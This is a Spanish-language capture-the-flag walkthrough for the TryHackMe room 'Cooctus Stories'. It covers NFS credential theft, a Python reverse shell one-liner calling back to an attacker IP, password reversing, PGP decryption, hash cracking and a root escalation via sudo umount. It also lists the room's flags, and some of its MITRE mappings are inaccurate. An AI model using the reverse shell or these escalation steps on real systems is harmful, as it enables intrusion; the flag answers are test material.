# Cooctus Stories

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Medium | CTF · Linux · NFS · Web · Escalada | cooctusstories | https://tryhackme.com/room/cooctusstories | Reconocimiento · Lateral Movement · Privesc | TryHackMe | NFS · Werkzeug (Python) · SSH · GnuPG | RCE (paradox) → Root |

---

**Contexto:** La sala gira en torno al Cooctus Clan, que ha sido el insider threat tras el hackeo de Overpass. Se descubre un servidor privado operado por el clan y el objetivo es descubrir sus planes. La ruta completa va desde montar un recurso NFS con credenciales del usuario paradox, comprometer una aplicación web Python (CATapp) en el puerto 8080, moverse lateralmente entre los usuarios paradox → szymex → tux → varg y terminar escalando a root desmontando un bind mount. Se aplican criptografía de rotación, fragmentos cifrados con PGP, cracking de hashes, análisis de repositorios git y abuso de sudo.

## Solucionario

### Task 1: Descubre los planes del Cooctus Clan (flags de Paradox, Szymex, Tux, Varg y Root)

**Explicación:** El escaneo de servicios muestra SSH (22), RPCbind (111), NFS/ACL (2049), un servicio web Werkzeug en el 8080 (título "CCHQ") y varios puertos mountd/nlockmgr.

**Fase 1 — Recurso NFS con credenciales:**

Montamos el share NFS y extraemos un backup de credenciales:

```
$ mkdir tmp
$ sudo mount -t nfs 10.10.94.63: tmp
$ tree tmp
tmp
└── var
    └── nfs
        └── general
            └── credentials.bak

$ cat tmp/var/nfs/general/credentials.bak
paradoxial.test
ShibaPretzel79
```

**Fase 2 — Aplicación web CATapp (puerto 8080):**

La enumeración con gobuster revela `/cat` (302 → /login) y `/login`. Con las credenciales `paradoxial.test:ShibaPretzel79` se accede y se redirige a `/cat`. En la página hay un formulario de subida. Enviando un payload como subida, conseguimos una reverse shell en Python:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```
$ nc -nlvp 4444
connect to [10.10.94.63] from (UNKNOWN) [10.10.94.63] 35218
paradox@cchq:~$ pwd
/home/paradox
```

**Fase 3 — Flag de Paradox:**

```
paradox@cchq:~$ cat user.txt
THM{2dccd1ab3e03990aea77359831c85ca2}
```

**Fase 4 — Movimiento lateral a Szymex:**

Cada minuto llega un wall de szymex con coordenadas de un "envío de Dr. Pepper". En `/home/szymex` hay una nota y un script `SniffingCat.py`:

```
paradox@cchq:/home/szymex$ cat note_to_para
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
```

El crontab ejecuta `/home/szymex/SniffingCat.py` como szymex cada minuto. El script aplica una transformación ROT13/custom y verifica que la contraseña cifrada sea `pureelpbxr`:

```python
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc
...

if enc_pw == "pureelpbxr":
    os.system("wall -g paradox " + message)
    os.system("wall -g paradox " + coords)
```

Ingeniería inversa: construimos la tabla de conversión y desciframos `pureelpbxr`:

```python
#!/usr/bin/python3
def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

s = 'abcdefghijklmnopqrstuvwxyz'
clear = list(s)
encoded = list(encode(s))
pwd = "pureelpbxr"
dec = ""
for i in pwd:
    dec += clear[encoded.index(i)]
print(dec)
```

```
$ python3 test.py
cherrycoke
```

Con la contraseña `cherrycoke` pasamos a szymex y leemos su flag:

```
szymex@cchq:~$ su szymex
Password: cherrycoke
szymex@cchq:~$ cat user.txt
THM{c89f9f4ef264e22001f9a9c3d72992ef}
```

**Fase 5 — Movimiento lateral a Tux (fragmentos y crack):**

La nota de Tux explica las "3 Tuxling Trials". El primer fragmento está en `nootcode.c`. Compilar no ayuda, pero aplicando sustituciones sed sobre las macros se obtiene el fragmento:

```
void key ( ) {
    printf ( "f96" "050a" "d61" ) ;  <------------------ first fragment
}
```

Primer fragmento: `f96050ad61`

El segundo fragmento está en `/media/tuxling_2` en un fichero PGP (`fragment.asc`) con su clave privada (`private.key`). Se importa la clave y se descifra:

```
szymex@cchq:/media/tuxling_2$ gpg --import private.key
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported

szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
```

Segundo fragmento: `6eaf62818d`

El tercer fragmento está en el directorio oculto `tuxling_3` del home de tux:

```
Tercer fragmento: 637b56db1552
```

Combinamos los tres fragmentos y obtenemos el hash a crackear:

```
f96050ad616eaf62818d637b56db1552
```

Usando CrackStation, la contraseña es `tuxykitty`. Con ella conectamos por SSH como tux:

```
$ sshpass -p "tuxykitty" ssh tux@10.10.94.63
tux@cchq:~$ cat user.txt
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
```

**Fase 6 — Movimiento lateral a Varg (CooctOS):**

tux puede ejecutar `/home/varg/CooctOS.py` como varg sin contraseña:

```
tux@cchq:/home/varg$ sudo -l
User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py
```

No podemos leer el script, pero en `cooctOS_src` hay un repositorio git. `git show` recupera la versión anterior del script, que contiene las credenciales de login "CooctOS":

```
for i in range(0,2):
    if pw != "slowroastpork":  <------------------------------------- Credentials
        pw = input("Password: ")
    else:
        if uname == "varg":
            os.setuid(1002)
            os.setgid(1002)
            pty.spawn("/bin/rbash")
            break
```

Con la contraseña `slowroastpork` accedemos como varg y leemos su flag:

```
$ sshpass -p "slowroastpork" ssh varg@10.10.94.63
varg@cchq:~$ cat user.txt
HM{3a33063a4a8a5805d17aa411a53286e6}
```

**Fase 7 — Escalada a Root (umount + bind mount):**

varg puede ejecutar `/bin/umount` como root sin contraseña. El propio varg tiene un bind mount de `cooctOS_src` en `/opt/CooctFS`, definido en `/etc/fstab`:

```
/home/varg/cooctOS_src  /opt/CooctFS    none    defaults,bind   0 0
```

Desmontando el bind mount queda expuesto el contenido real del directorio `/opt/CooctFS`, incluyendo la carpeta `/root` del sistema:

```
varg@cchq:~$ sudo /bin/umount /opt/CooctFS
varg@cchq:~$ ls -la /opt/CooctFS/
total 12
drwxr-xr-x 3 root root 4096 Feb 20 09:09 .
drwxr-xr-x 3 root root 4096 Feb 20 14:30 ..
drwxr-xr-x 5 root root 4096 Feb 20 09:16 root
```

El `root.txt` accesible no es la flag real ("No flag here. You aren't root yet."), pero dentro de `/opt/CooctFS/root/.ssh/` está la clave privada id_rsa de root. La copiamos, le damos permisos 400 y conectamos por SSH:

```
$ chmod 400 root.key
$ ssh -i root.key root@10.10.94.63
root@cchq:~# cat /root/root.txt
THM{H4CK3D_BY_C00CTUS_CL4N}
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | What is the user flag of Paradox? | `THM{2dccd1ab3e03990aea77359831c85ca2}` |
| 2 | What is Szymex's user flag? | `THM{c89f9f4ef264e22001f9a9c3d72992ef}` |
| 3 | What is Tux's user flag? | `THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}` |
| 4 | What is Varg's user flag? | `HM{3a33063a4a8a5805d17aa411a53286e6}` |
| 5 | What is the root flag? | `THM{H4CK3D_BY_C00CTUS_CL4N}` |

### Task 2: Conclusión de la investigación

**Explicación:** Una vez localizadas todas las flags y confirmados los planes del clan, la sala se completa. No se requiere respuesta en esta última tarea.

`No answer needed`

---

**Metodología:** Enumeración de NFS y servicios (rpcbind, mountd) → montaje de share → descubrimiento de credenciales → acceso a la aplicación web (CATapp) con RCE vía subida maliciosa → reverse shell como paradox → descubrimiento de procesos programados (wall/cron) → ingeniería inversa del cifrado del script (ROT13) → lateral movement por password reuse → colección de fragmentos (obfuscación de macros, PGP, directorios ocultos) → cracking del hash combinado (CrackStation) → análisis de git history → uso de sudo (CooctOS) → abuso de umount sobre bind mount → acceso root por clave SSH.

**Learning chain:** mount NFS → credenciales de backup → pentest de aplicación Python (Werkzeug) → RCE y reverse shell → análisis de cronjobs y wall → reverso de algoritmo de cifrado casero → su/sudo lateral → sed + obfuscación C → GnuPG (gpg --import/--decrypt) → crack de hashes → git show (historial) → sudo configurado por binario → bind mount y umount → clave privada de root.

**Lección:** *Las credenciales reaprovechadas, los secretos escondidos en backups, scripts programados y el historial de un repositorio git son fuentes de información valiosas. Un bind mount visible desde /etc/fstab puede ocultar datos sensibles del sistema: desmontarlo con sudo es un vector de escalada poco convencional pero efectivo.*

**MITRE ATT&CK:** T1021.001 (Remote Services: SMB/Windows Admin Shares — NFS share para acceder a credenciales), T1552.001 (Unsecured Credentials: Credentials In Files), T1059.006 (Python reverse shell), T1557 (Adversary-in-the-Middle/credenciales de aplicación), T1547/T1053 (persistencia via cron), T1573 (cifrado de canal), T1550 (Use Alternate Authentication Material — password reuse), T1552.004 (Private Keys), T1078 (Valid Accounts).

**Fuente:** [TryHackMe - Cooctus Stories](https://tryhackme.com/room/cooctusstories)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.